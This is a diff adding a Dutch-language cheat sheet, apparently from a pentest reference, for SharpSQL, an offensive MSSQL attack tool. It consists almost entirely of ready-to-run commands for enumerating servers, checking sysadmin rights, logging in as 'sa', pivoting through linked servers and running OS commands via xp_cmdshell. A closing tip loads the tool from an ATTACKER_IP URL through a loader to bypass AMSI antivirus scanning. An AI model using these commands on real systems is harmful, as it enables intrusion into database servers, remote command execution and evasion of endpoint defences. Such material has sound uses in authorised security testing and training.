@@ -1,0 +1,39 @@
+# SharpSQL — MSSQL server aanval toolkit (C#)
+# .NET tool voor MSSQL enumeratie, command execution en linked server aanvallen
+#
+# === Syntax ===
+# SharpSQL.exe -instance <server> -command <SQL> [-username USER] [-password PASS]
+#
+# === Belangrijkste opties ===
+# -instance SERVER       MSSQL server (IP of hostname, optioneel ,poort)
+# -command SQL           SQL query om uit te voeren
+# -username USER         SQL login gebruikersnaam (leeg = Windows auth)
+# -password PASS         SQL login wachtwoord
+# -linked SERVER         Voer query uit op linked server
+#
+# === Voorbeelden ===
+# -- Basis enumeratie --
+# Server versie opvragen:
+SharpSQL.exe -instance TARGET -command "SELECT @@version"
+# Huidige gebruiker:
+SharpSQL.exe -instance TARGET -command "SELECT SYSTEM_USER"
+# Database admin check:
+SharpSQL.exe -instance TARGET -command "SELECT IS_SRVROLEMEMBER('sysadmin')"
+# Databases opsommen:
+SharpSQL.exe -instance TARGET -command "SELECT name FROM master.sys.databases"
+#
+# -- SQL authenticatie --
+SharpSQL.exe -instance TARGET -username sa -password PASS -command "SELECT @@version"
+#
+# -- Linked server aanvallen --
+# Linked servers opsommen:
+SharpSQL.exe -instance TARGET -command "EXEC sp_linkedservers"
+# Query via linked server:
+SharpSQL.exe -instance TARGET -linked LINKED_SERVER -command "EXEC sp_linkedservers"
+#
+# -- Command execution (xp_cmdshell) --
+SharpSQL.exe -instance TARGET -command "EXEC master..xp_cmdshell 'whoami'"
+#
+# Tip: Windows auth wordt gebruikt als username/password niet opgegeven
+# Tip: Laad via NetLoader voor AMSI bypass: Loader.exe -path http://ATTACKER_IP/tools/SharpSQL.exe -args "-instance TARGET -command ..."
+# Tip: Zie ook: man_powerupsql, mssql_xpcmdshell, mssql_linked
